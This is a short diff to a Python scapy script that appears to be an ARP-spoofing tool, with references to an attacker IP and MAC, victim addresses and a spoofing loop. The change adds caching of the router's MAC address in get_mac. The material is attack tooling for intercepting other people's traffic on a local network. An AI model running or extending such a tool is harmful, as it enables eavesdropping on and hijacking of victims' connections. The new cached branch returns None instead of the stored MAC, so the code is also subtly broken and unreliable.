@@ -15,6 +15,8 @@ arp_looping = False #set this to false to stop the thread
 def get_mac(ip):
     if ip == ATTACKER_IP :
         return ATTACKER_MAC
+    if ip == router_ip and router_mac:
+        return 
     # creating an ARP request to the ip address
     arp_request = scapy.ARP(pdst=ip)
     # setting the denstination MAC address to broadcast MAC
@@ -28,6 +30,9 @@ def get_mac(ip):
     if answ:
         # we choose the first MAC address and select
         # the MAC address using the field hwsrc
+        if ip == router_ip:
+            global router_mac
+            router_mac = answ[0][1].hwsrc
         return answ[0][1].hwsrc
     else:
         print("No ARP response for {}".format(ip))
@@ -79,6 +84,7 @@ victim_addresses = {}
 router_ip = None
 current_ip = None
 iface = None
+router_mac = None
 
 def arp_prep_automated(router_ip_, iface_ = "enp0s10") :
     global victim_addresses, router_ip, iface, current_ip
